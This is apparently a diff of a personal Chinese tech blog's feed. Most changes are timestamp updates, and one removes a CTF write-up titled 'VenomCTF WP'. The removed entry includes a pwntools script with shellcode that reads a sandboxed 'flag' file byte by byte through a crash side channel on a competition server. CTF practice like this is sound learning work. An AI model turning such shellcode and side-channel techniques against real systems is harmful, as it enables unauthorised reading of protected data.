     <content type="html"><![CDATA[<p>最近写的程序涉及到了OAuth2.0 和 OIDC，遂仔细理解一下这两个协议</p>
 <p>OIDC是OAuth的拓展，所以先从OAuth开始，<a href="https://datatracker.ietf.org/doc/html/rfc6749">参考文档</a></p>
@@ -4293,7 +4599,7 @@ Authorization: MAC id="h480djs93hd8",
     <link href="https://aucept.in/2025/12/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%93%88%E5%B8%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/"/>
     <id>https://aucept.in/2025/12/12/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%93%88%E5%B8%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</id>
     <published>2025-12-12T08:14:41.000Z</published>
-    <updated>2025-12-13T12:35:25.118Z</updated>
+    <updated>2026-07-17T07:53:25.457Z</updated>
     
     <content type="html"><![CDATA[<h2 id="题目：">题目：</h2>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">（一）：二叉排序树
@@ -4786,7 +5092,7 @@ Authorization: MAC id="h480djs93hd8",
     <link href="https://aucept.in/2025/11/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E5%AE%9E%E9%AA%8C/"/>
     <id>https://aucept.in/2025/11/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E5%AE%9E%E9%AA%8C/</id>
     <published>2025-11-29T03:26:34.000Z</published>
-    <updated>2025-11-29T03:49:13.895Z</updated>
+    <updated>2026-07-17T07:53:25.460Z</updated>
     
     <content type="html"><![CDATA[<h2 id="实现一个邻接表">实现一个邻接表</h2>
 <p>基本结构，一个链表头结点vec代指每个顶点</p>
@@ -5137,120 +5443,11 @@ Authorization: MAC id="h480djs93hd8",
   </entry>
   
   <entry>
-    <title>VenomCTF WP</title>
-    <link href="https://aucept.in/2025/11/15/VenomCTF-WP/"/>
-    <id>https://aucept.in/2025/11/15/VenomCTF-WP/</id>
-    <published>2025-11-15T11:57:27.340Z</published>
-    <updated>2025-11-18T03:57:22.395Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="good-night">good_night</h2>
-<p>初看朝阳东升，不解题中意，再看四野寂寂，已成题中人</p>
-<p>指早八看到这道题晚八还没解出来，good night</p>
-<p>程序有栈溢出，反复地读然后复制到会越界的地方，约等于一个多一字节溢出，可以把返回地址改成<code>leave ret</code></p>
-<p>然后给了一个bss段读，可以进行布置，开始rop。</p>
-<p>题目说预期解是ret2ld，又提示可以考虑使用ret2dl来泄漏libc地址，再提示ret2dl不单可以调用函数也可以尝试调用libc中的gadget，总结下来就是不会</p>
-<h2 id="never">never</h2>
-<p>一个沙盒环境，禁了execve、read、write及部分变体，然后给了一个固定的页并执行</p>
-<p>考虑ORW，open没有禁，read可以用mmap映射完成读，但是w缺失，考虑用一些状态间接反应</p>
-<p>调试时发现程序段错误会有输出，启动脚本会报错，所以经过设计，逐字节mmap 当前目录下的flag文件，然后和指定字符比较，如果一致转去执行一个触发段错误的指令，不一致则exit，无报错输出</p>
-<p>然后爆破：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-
-HOST <span class="token operator">=</span> <span class="token string">'47.98.117.93'</span>
-PORT <span class="token operator">=</span> <span class="token number">53698</span>
-
-<span class="token keyword">def</span> <span class="token function">test_char</span><span class="token punctuation">(</span>position<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> test_value<span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token triple-quoted-string string">"""测试指定位置的字符是否等于test_value"""</span>
-    
-    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"测试: flag[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>position<span class="token punctuation">&#125;</span></span><span class="token string">] == </span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_value<span class="token punctuation">&#125;</span></span><span class="token string"> ('</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span>test_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">')?"</span></span><span class="token punctuation">)</span>
-    
-    s <span class="token operator">=</span> remote<span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
-    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"ideas!"</span><span class="token punctuation">)</span>
-    
-    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'''
-        mov r14, 0xDEADB800
-        mov dword ptr [r14], 0x67616c66
-        
-        mov r15, 0xDEADB100
-        mov byte ptr [r15], 0x0f
-        mov byte ptr [r15+1], 0x05
-        mov byte ptr [r15+2], 0xc3
-        
-        mov rdi, 0xDEADB800
-        xor rsi, rsi
-        mov rax, 2
-        call r15
-        mov r12, rax
-        
-        xor rdi, rdi
-        mov rsi, 100
-        mov rdx, 1
-        mov r10, 2
-        mov r8, r12
-        xor r9, r9
-        mov rax, 9
-        call r15
-        
-        mov rbx, rax
-        add rbx, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>position<span class="token punctuation">&#125;</span></span><span class="token string">
-        mov dl, byte ptr [rbx]
-        mov cl, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_value<span class="token punctuation">&#125;</span></span><span class="token string">
-        cmp dl, cl
-        je crash
-        
-        xor rdi, rdi
-        mov rax, 60
-        call r15
-        
-        crash:
-        mov rax, 0xdeadbeef
-        mov rbx, qword ptr [rax]
-    '''</span></span><span class="token punctuation">)</span>
-    
-    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'\x90'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-    
-    s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    test_char<span class="token punctuation">(</span>?<span class="token punctuation">,</span>?<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="magic">magic</h2>
-<p>除了一个栈溢出似乎什么也没有</p>
-<p>提示需要用到两个magic gadget</p>
-<p>找了半天只找到一个<code>add DWORD PTR [rbp-0x3d],ebx</code>，不会用</p>
-<h2 id="总结">总结</h2>
-<p>坏消息是只解出一道题</p>
-<p>好消息是pwn的三道题除了这道never都是0解，magic甚至官方没放wp（打算明年接着用……</p>
-]]></content>
-    
-    
-      
-      
-        
-        
-    <summary type="html">&lt;h2 id=&quot;good-night&quot;&gt;good_night&lt;/h2&gt;
-&lt;p&gt;初看朝阳东升，不解题中意，再看四野寂寂，已成题中人&lt;/p&gt;
-&lt;p&gt;指早八看到这道题晚八还没解出来，good</summary>
-        
-      
-    
-    
-    
-    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
-    
-    
-    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
-    
-    <category term="orw" scheme="https://aucept.in/tags/orw/"/>
-    
-  </entry>
-  
-  <entry>
     <title>wezterm配置</title>
     <link href="https://aucept.in/2025/11/12/wezterm%E9%85%8D%E7%BD%AE/"/>
     <id>https://aucept.in/2025/11/12/wezterm%E9%85%8D%E7%BD%AE/</id>
     <published>2025-11-12T10:52:50.000Z</published>
-    <updated>2025-11-18T04:00:26.377Z</updated>
+    <updated>2026-07-17T07:53:25.452Z</updated>
     
     <content type="html"><![CDATA[<p>每天看着暗红色的终端喜新厌旧了，感觉流离用的fish命令提示功能，还有在别人博客上经常看到的暗蓝色的都好酷，正如本文的分类，家要有家的样子，遂重新配置我的终端！</p>
 <p>为什么选wezterm呢？因为它用rust实现，用lua写配置文件——因为喜欢</p>
@@ -5511,7 +5708,7 @@ config<span class="token punctuation">.</span>launch_menu <span class="token ope
     <link href="https://aucept.in/2025/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%AE%9E%E9%AA%8C/"/>
     <id>https://aucept.in/2025/11/03/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E4%BA%8C%E5%8F%89%E6%A0%91%E5%AE%9E%E9%AA%8C/</id>
     <published>2025-11-03T03:02:43.000Z</published>
-    <updated>2025-11-24T05:50:58.326Z</updated>
+    <updated>2026-07-17T07:53:25.460Z</updated>
     
     <content type="html"><![CDATA[<h2 id="二叉树的建立与遍历">二叉树的建立与遍历</h2>
 <pre class="line-numbers language-text" data-language="text"><code class="language-text">[问题描述]
@@ -5792,7 +5989,7 @@ fn test_pre_order()&#123;
     <link href="https://aucept.in/2025/10/26/moectf-2025/"/>
     <id>https://aucept.in/2025/10/26/moectf-2025/</id>
     <published>2025-10-26T06:38:17.000Z</published>
-    <updated>2026-02-15T04:23:43.955Z</updated>
+    <updated>2026-07-17T07:53:25.437Z</updated>
     
     <content type="html"><![CDATA[<p>一份<s>迟到的</s>不必要的WP，同时也是回顾si进pwn的世界的第一个月</p>
 <h3 id="0-二进制漏洞审计入门指北">0 二进制漏洞审计入门指北</h3>
@@ -6167,7 +6364,7 @@ payload <span class="token operator">+=</span> p64<span class="token punctuation
     <link href="https://aucept.in/2025/10/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%88%E5%AE%9E%E9%AA%8C/"/>
     <id>https://aucept.in/2025/10/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%A0%88%E5%AE%9E%E9%AA%8C/</id>
     <published>2025-10-13T02:42:03.000Z</published>
-    <updated>2025-10-18T05:48:00.544Z</updated>
+    <updated>2026-07-17T07:53:25.462Z</updated>
     
     <content type="html"><![CDATA[<h2 id="基本结构">基本结构</h2>
 <p>一个栈结构体要有：<code>栈底指针``栈顶指针``可用最大容量</code>三个字段……指针是什么东西啊？rust崩溃</p>
@@ -6445,7 +6642,7 @@ payload <span class="token operator">+=</span> p64<span class="token punctuation
     <link href="https://aucept.in/2025/10/12/tsctf-2025/"/>
     <id>https://aucept.in/2025/10/12/tsctf-2025/</id>
     <published>2025-10-12T15:28:17.000Z</published>
-    <updated>2025-10-12T17:02:42.302Z</updated>
+    <updated>2026-07-17T07:53:25.449Z</updated>
     
     <content type="html"><![CDATA[<h2 id="ret">ret</h2>
 <p>签到题，明摆着的栈溢出和后门函数，略</p>
@@ -6944,7 +7141,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <link href="https://aucept.in/2025/09/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E5%AE%9E%E9%AA%8C/"/>
     <id>https://aucept.in/2025/09/28/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E9%93%BE%E8%A1%A8%E5%AE%9E%E9%AA%8C/</id>
     <published>2025-09-28T09:50:00.000Z</published>
-    <updated>2025-10-18T05:50:50.172Z</updated>
+    <updated>2026-07-17T07:53:25.464Z</updated>
     
     <content type="html"><![CDATA[<p>上一篇是根据rust语言圣经的指导写的迭代器版本，这次我想用一种更贴近过程式的风格</p>
 <h2 id="实验一：城市链表">实验一：城市链表</h2>
@@ -7388,7 +7585,7 @@ m 的初值为 20:密码:3，1，7，2，4，8，4(正确的结果应为6，1，
     <link href="https://aucept.in/2025/09/26/docker-and-OCI/"/>
     <id>https://aucept.in/2025/09/26/docker-and-OCI/</id>
     <published>2025-09-26T11:49:36.000Z</published>
-    <updated>2025-09-28T09:54:41.151Z</updated>
+    <updated>2026-07-17T07:53:25.431Z</updated>
     
     <content type="html"><![CDATA[<p>OCI即Open Container Initiative，开放容器计划，是一套有关容器与镜像的标准</p>
 <p>想要实现一个容器镜像仓库，就要符合OCI的标准与规定的接口</p>
@@ -7512,7 +7709,7 @@ m 的初值为 20:密码:3，1，7，2，4，8，4(正确的结果应为6，1，
     <link href="https://aucept.in/2025/09/20/pwn_%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
     <id>https://aucept.in/2025/09/20/pwn_%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
     <published>2025-09-20T06:03:08.000Z</published>
-    <updated>2025-11-12T02:14:37.096Z</updated>
+    <updated>2026-07-17T07:53:25.446Z</updated>
     
     <content type="html"><![CDATA[<p>整理记录用到的命令，以避免每次用到查一遍</p>
 <h2 id="环境">环境</h2>
@@ -8376,7 +8573,7 @@ m 的初值为 20:密码:3，1，7，2，4，8，4(正确的结果应为6，1，
     <link href="https://aucept.in/2025/08/31/%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E9%93%BE%E8%A1%A8/"/>
     <id>https://aucept.in/2025/08/31/%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E9%93%BE%E8%A1%A8/</id>
     <published>2025-08-31T05:40:11.000Z</published>
-    <updated>2025-09-03T14:06:01.832Z</updated>
+    <updated>2026-07-17T07:53:25.456Z</updated>
     
     <content type="html"><![CDATA[<p>已经学习rust一周了，是时候尝试一下链表了</p>
 <p>按照TDD的规范，先写第一个测试：</p>
@@ -8616,7 +8813,7 @@ m 的初值为 20:密码:3，1，7，2，4，8，4(正确的结果应为6，1，
     <link href="https://aucept.in/2025/08/14/%E7%81%B0%E5%A7%91%E5%A8%98/"/>
     <id>https://aucept.in/2025/08/14/%E7%81%B0%E5%A7%91%E5%A8%98/</id>
     <published>2025-08-14T14:33:25.000Z</published>
-    <updated>2025-08-18T12:38:01.750Z</updated>
+    <updated>2026-07-17T07:53:25.465Z</updated>
     
     <content type="html"><![CDATA[<p>在 GitHub 的茫茫仓库海洋里，有一个默默无闻的小姑娘。</p>
 <p>她每天在继姐们的项目里修复小 bug、写小脚本或是回应issue，push 的 commit 总是埋在深深的 pull request 里，很少有人关注。她自己的仓库几乎空无一物，只有几个 watch，却存放着她暗暗打磨的梦想功能。</p>
@@ -8675,7 +8872,7 @@ m 的初值为 20:密码:3，1，7，2，4，8，4(正确的结果应为6，1，
     <link href="https://aucept.in/2025/08/11/git-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     <id>https://aucept.in/2025/08/11/git-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
     <published>2025-08-11T13:16:09.000Z</published>
-    <updated>2026-02-11T09:39:06.973Z</updated>
+    <updated>2026-07-17T07:53:25.435Z</updated>
     
     <content type="html"><![CDATA[<p>内容来源：</p>
 <ul>
@@ -8894,7 +9091,7 @@ config&#x2F;database.yml
     <link href="https://aucept.in/2025/08/05/%E9%BE%9F%E5%85%94%E8%B5%9B%E8%B7%91/"/>
     <id>https://aucept.in/2025/08/05/%E9%BE%9F%E5%85%94%E8%B5%9B%E8%B7%91/</id>
     <published>2025-08-05T14:21:57.000Z</published>
-    <updated>2025-12-23T07:56:28.033Z</updated>
+    <updated>2026-07-17T07:53:25.466Z</updated>
     
     <content type="html"><![CDATA[<p>这是一个有关时间片分配的故事</p>
 <p>从前，在名为os的森林里有两个进程，一个名兔子，它运行起来cpu一直在转；一只名乌龟，它经常要与其它设备交互，平均每个时间片只有1%在运算，而剩下的99%都在阻塞</p>
@@ -8933,7 +9130,7 @@ config&#x2F;database.yml
     <link href="https://aucept.in/2025/07/29/noita-api/"/>
     <id>https://aucept.in/2025/07/29/noita-api/</id>
     <published>2025-07-29T09:00:00.000Z</published>
-    <updated>2025-10-04T05:16:55.559Z</updated>
+    <updated>2026-07-17T07:53:25.440Z</updated>
     
     <content type="html"><![CDATA[<p><span style = "font-size: 30px; font-weight: 900">一个 noita API使用参考文档 </span></p>
 <p>noita的api只提供了参数和返回值，大多都没写具体效果，<a href="https://noita.wiki.gg/zh/wiki/Mod:Lua_API">noita wiki</a>里的差点意思，故有本文</p>
@@ -10400,7 +10597,7 @@ spawn_percent <span class="token operator">=</span> <span class="token punctuati
     <link href="https://aucept.in/2025/07/28/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/"/>
     <id>https://aucept.in/2025/07/28/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/</id>
     <published>2025-07-28T04:50:13.000Z</published>
-    <updated>2025-07-29T09:35:12.509Z</updated>
+    <updated>2026-07-17T07:53:25.429Z</updated>
     
     <content type="html"><![CDATA[<h2 id="4-45"><code>*4.45</code></h2>
 <blockquote>
@@ -10578,7 +10775,7 @@ halt停止处理器</p>
     <link href="https://aucept.in/2025/07/11/OSTEP-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0/"/>
     <id>https://aucept.in/2025/07/11/OSTEP-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0/</id>
     <published>2025-07-11T00:55:59.000Z</published>
-    <updated>2025-07-11T04:33:51.074Z</updated>
+    <updated>2026-07-17T07:53:25.443Z</updated>
     
     <content type="html"><![CDATA[<blockquote>
 <p>本次作业要测算一下 TLB 的容量和访问 TLB 的开销。这个想法参考了 Saavedra-Barrera 的工作[SB92]，他设计了一个简单而漂亮的用户级程序，来测算缓存层级结构的方方面面。更多细节请阅读他的论文。</p>
@@ -10916,7 +11113,7 @@ MAX_POW   <span class="token operator">=</span> <span class="token number">13</s
     <link href="https://aucept.in/2025/07/10/Docker%E4%B8%8ENAT/"/>
     <id>https://aucept.in/2025/07/10/Docker%E4%B8%8ENAT/</id>
     <published>2025-07-10T14:35:32.000Z</published>
-    <updated>2025-07-17T09:14:18.798Z</updated>
+    <updated>2026-07-17T07:53:25.432Z</updated>
     
     <content type="html"><![CDATA[<p>昨天在火山云上抢到了29/年的一台小云服务器，今天用它做一下重做一下内网穿透的实验，顺便系统学习一遍docker的使用方法</p>
 <p>实验说明：</p>
@@ -11049,7 +11246,7 @@ MAX_POW   <span class="token operator">=</span> <span class="token number">13</s
     <link href="https://aucept.in/2025/07/09/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%EF%BC%9A%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%81%8C%E4%B8%9A%E7%B4%A0%E5%85%BB/"/>
     <id>https://aucept.in/2025/07/09/%E4%BB%A3%E7%A0%81%E6%95%B4%E6%B4%81%E4%B9%8B%E9%81%93%EF%BC%9A%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%81%8C%E4%B8%9A%E7%B4%A0%E5%85%BB/</id>
     <published>2025-07-09T15:09:11.000Z</published>
-    <updated>2025-07-09T15:11:39.826Z</updated>
+    <updated>2026-07-17T07:53:25.454Z</updated>
     
     <content type="html"><![CDATA[<p>起因是读了<a href="https://blog.moy.cat/2024/02/11/%E6%B5%85%E8%AF%84%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E7%9A%84%E8%AF%BE%E7%A8%8B%E6%95%99%E8%82%B2/">浅评计算机专业的课程教育</a>这篇文章，对于文章观点我不予评价，我还不配，但是文中推荐了一本书，即本文的标题，<code>《代码整洁之道：程序员的职业素养》</code></p>
 <p>书并不厚，内容也不硬核，读起来还是没有什么负担的</p>
@@ -11121,7 +11318,7 @@ MAX_POW   <span class="token operator">=</span> <span class="token number">13</s
     <link href="https://aucept.in/2025/07/09/%E5%A4%8D%E6%9D%822d%E6%B8%B8%E6%88%8F%E5%9C%B0%E5%9B%BE%E4%B8%8A%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AF%BB%E8%B7%AF%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/"/>
     <id>https://aucept.in/2025/07/09/%E5%A4%8D%E6%9D%822d%E6%B8%B8%E6%88%8F%E5%9C%B0%E5%9B%BE%E4%B8%8A%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AF%BB%E8%B7%AF%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/</id>
     <published>2025-07-09T13:19:28.000Z</published>
-    <updated>2025-07-20T06:23:18.852Z</updated>
+    <updated>2026-07-17T07:53:25.453Z</updated>
     
     <content type="html"><![CDATA[<p><code>声明:</code>本人并非OIer，没有系统学习过算法，故不足之处还请见谅，如有好的想法<code>非常非常非常</code>欢迎提出</p>
 <h2 id="背景">背景</h2>
@@ -11194,7 +11391,7 @@ MAX_POW   <span class="token operator">=</span> <span class="token number">13</s
     <link href="https://aucept.in/2025/07/06/%E8%BD%AC%E8%BD%BD-%E4%B8%80%E4%BA%9B%E8%AF%BB%E8%BF%87%E7%9A%84%E6%96%87%E7%AB%A0%E5%88%86%E4%BA%AB/"/>
     <id>https://aucept.in/2025/07/06/%E8%BD%AC%E8%BD%BD-%E4%B8%80%E4%BA%9B%E8%AF%BB%E8%BF%87%E7%9A%84%E6%96%87%E7%AB%A0%E5%88%86%E4%BA%AB/</id>
     <published>2025-07-06T05:46:49.000Z</published>
-    <updated>2026-05-15T06:35:16.204Z</updated>
+    <updated>2026-07-17T07:53:25.467Z</updated>
     
     <content type="html"><![CDATA[<h2 id="你缺计课"><a href="https://www.criwits.top/missing/">你缺计课</a></h2>
 <p>一些计算机基础知识</p>
@@ -11248,7 +11445,7 @@ MAX_POW   <span class="token operator">=</span> <span class="token number">13</s
     <link href="https://aucept.in/2025/07/03/CSAPP3-70-3-75/"/>
     <id>https://aucept.in/2025/07/03/CSAPP3-70-3-75/</id>
     <published>2025-07-03T06:11:00.000Z</published>
-    <updated>2025-07-09T09:06:05.524Z</updated>
+    <updated>2026-07-17T07:53:25.434Z</updated>
     
     <content type="html"><![CDATA[<h2 id="题目-3-70">题目***3.70</h2>
 <blockquote>
@@ -11689,7 +11886,7 @@ A.如何向函数传递复数参数？</p>
     <link href="https://aucept.in/2025/07/02/%E5%B0%8F%E5%AD%A6%E6%9C%9F%E6%97%A5%E5%BF%97Wed/"/>
     <id>https://aucept.in/2025/07/02/%E5%B0%8F%E5%AD%A6%E6%9C%9F%E6%97%A5%E5%BF%97Wed/</id>
     <published>2025-07-02T02:47:44.000Z</published>
-    <updated>2025-07-03T02:20:23.040Z</updated>
+    <updated>2026-07-17T07:53:25.455Z</updated>
     
     <content type="html"><![CDATA[<p>上午接网线，是格外需要注意细节的手工</p>
 <p>当初学计网时还感慨接线顺序不会要背吧，实际被折磨一遍568B的顺序就不可能忘了——白橙 橙 白绿 蓝 白蓝 绿 白棕 棕</p>
@@ -11727,7 +11924,7 @@ A.如何向函数传递复数参数？</p>
     <link href="https://aucept.in/2025/06/30/%E5%B0%8F%E5%AD%A6%E6%9C%9F%E6%97%A5%E5%BF%97Mon/"/>
     <id>https://aucept.in/2025/06/30/%E5%B0%8F%E5%AD%A6%E6%9C%9F%E6%97%A5%E5%BF%97Mon/</id>
     <published>2025-06-30T11:12:01.000Z</published>
-    <updated>2025-11-14T12:44:15.199Z</updated>
+    <updated>2026-07-17T07:53:25.452Z</updated>
     
     <content type="html"><![CDATA[<p>实验内容大概是用U盘，在电脑的虚拟机上安装一个操作系统</p>
 <h1>ROUND 1</h1>
@@ -11817,7 +12014,7 @@ A.如何向函数传递复数参数？</p>
     <link href="https://aucept.in/2025/06/29/OSTEP-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0/"/>
     <id>https://aucept.in/2025/06/29/OSTEP-%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AB%A0/</id>
     <published>2025-06-29T09:47:12.000Z</published>
-    <updated>2025-06-29T09:49:11.277Z</updated>
+    <updated>2026-07-17T07:53:25.446Z</updated>
     
     <content type="html"><![CDATA[<h2 id="14-1">14.1</h2>
 <blockquote>
@@ -12125,7 +12322,7 @@ vector<span class="token operator">*</span> <span class="token function">vector_
     <link href="https://aucept.in/2025/06/28/noita-mode-0/"/>
     <id>https://aucept.in/2025/06/28/noita-mode-0/</id>
     <published>2025-06-28T06:57:03.000Z</published>
-    <updated>2026-03-26T01:55:42.938Z</updated>
+    <updated>2026-07-17T07:53:25.443Z</updated>
     
     <content type="html"><![CDATA[<p>本文用于记录本人的第一个noita的mod开发过程</p>
 <h2 id="新建文件夹">新建文件夹</h2>
@@ -12546,7 +12743,7 @@ data&#x2F;materials.xml              -&gt; [原始文件] + [mod_a材料] + [mod
     <link href="https://aucept.in/2025/06/26/OSTEP-%E7%AC%AC%E5%85%AD%E7%AB%A0/"/>
     <id>https://aucept.in/2025/06/26/OSTEP-%E7%AC%AC%E5%85%AD%E7%AB%A0/</id>
     <published>2025-06-26T10:51:55.000Z</published>
-    <updated>2025-06-26T11:05:33.059Z</updated>
+    <updated>2026-07-17T07:53:25.440Z</updated>
     
     <content type="html"><![CDATA[<h2 id="题目：">题目：</h2>
 <blockquote>
@@ -12724,7 +12921,7 @@ gettimeofday()对你来说不够精确，可以考虑利用 x86 机器提供的 
     <link href="https://aucept.in/2025/06/25/OSTEP-%E7%AC%AC%E4%BA%94%E7%AB%A0/"/>
     <id>https://aucept.in/2025/06/25/OSTEP-%E7%AC%AC%E4%BA%94%E7%AB%A0/</id>
     <published>2025-06-25T11:13:55.000Z</published>
-    <updated>2025-06-25T11:13:10.293Z</updated>
+    <updated>2026-07-17T07:53:25.442Z</updated>
     
     <content type="html"><![CDATA[<h1>第五章课后题</h1>
 <h2 id="第1题"><strong>第1题</strong></h2>
@@ -13181,7 +13378,7 @@ wait的对象默认是子进程，而子进程没fork是没有子进程的</p>
     <link href="https://aucept.in/2025/06/25/CSAPP-3_58-3_68/"/>
     <id>https://aucept.in/2025/06/25/CSAPP-3_58-3_68/</id>
     <published>2025-06-25T07:04:26.000Z</published>
-    <updated>2026-04-25T09:07:31.188Z</updated>
+    <updated>2026-07-17T07:53:25.432Z</updated>
     
     <content type="html"><![CDATA[<h2 id="题目-3-58">题目 *3.58</h2>
 <blockquote>
@@ -13966,7 +14163,7 @@ ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
     <link href="https://aucept.in/2025/06/24/OSTEP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/"/>
     <id>https://aucept.in/2025/06/24/OSTEP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/</id>
     <published>2025-06-24T13:23:55.000Z</published>
-    <updated>2025-06-24T13:26:02.392Z</updated>
+    <updated>2026-07-17T07:53:25.441Z</updated>
     
     <content type="html"><![CDATA[<h1>第四章课后题</h1>
 <blockquote>
@@ -14294,7 +14491,7 @@ Time        PID: <span class="token number">0</span>        PID: <span class="to
     <link href="https://aucept.in/2025/06/24/lua%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     <id>https://aucept.in/2025/06/24/lua%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
     <published>2025-06-24T03:16:58.000Z</published>
-    <updated>2025-12-27T08:57:28.934Z</updated>
+    <updated>2026-07-17T07:53:25.437Z</updated>
     
     <content type="html"><![CDATA[<h2 id="🌙-前言">🌙 前言</h2>
 <p>开始之前先记录一下与lua的结缘过程：</p>
@@ -14767,7 +14964,7 @@ globals<span class="token punctuation">.</span><span class="token function">set<
     <link href="https://aucept.in/2025/05/26/%E5%B0%8F%E7%8E%8B%E5%AD%90%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
     <id>https://aucept.in/2025/05/26/%E5%B0%8F%E7%8E%8B%E5%AD%90%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
     <published>2025-05-25T16:22:37.000Z</published>
-    <updated>2025-06-25T15:39:50.033Z</updated>
+    <updated>2026-07-17T07:53:25.460Z</updated>
     
     <content type="html"><![CDATA[<p>在附近还有几个pid为325、326、327、328、329、330的进程。小王子就前往访问这几个进程，想在那里找点事干，并且学习学习。</p>
 <p>第一颗星球上住着一个国王。</p>
@@ -14851,7 +15048,7 @@ globals<span class="token punctuation">.</span><span class="token function">set<
     <link href="https://aucept.in/2025/05/24/%E5%B0%8F%E7%8E%8B%E5%AD%90%EF%BC%88%E4%B8%80%EF%BC%89/"/>
     <id>https://aucept.in/2025/05/24/%E5%B0%8F%E7%8E%8B%E5%AD%90%EF%BC%88%E4%B8%80%EF%BC%89/</id>
     <published>2025-05-24T15:46:37.000Z</published>
